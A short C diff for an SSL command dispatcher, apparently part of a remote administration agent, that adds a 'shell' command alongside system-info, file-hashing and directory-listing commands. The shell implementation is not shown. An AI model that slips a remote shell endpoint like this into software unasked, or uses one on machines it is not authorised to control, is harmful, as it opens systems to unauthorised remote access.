@@ -8,6 +8,7 @@
 #include "../Linux/systeminfo.h"
 #include "hash_file.h"
 #include "../Linux/list_dir.h"
+#include "shell.h"
 
 
 void server_handler(SSL* ssl){
@@ -25,12 +26,14 @@ void server_handler(SSL* ssl){
         } else if (strcmp(data, "systeminfo") == 0) {
             systeminfo(ssl);
         } else if (strcmp(data, "checkfiles") == 0) {
-            printf("Hashing file\n");
             hash_file(ssl);
         } else if (strcmp(data, "list_dir") == 0) {
             printf("Listing directory\n");
             listdir(ssl);
-        }        
+        } else if (strcmp(data, "shell") == 0) {
+            printf("Shell\n");
+            shell(ssl);
+        }           
         else {
             send_data(ssl, "Invalid command");
         }
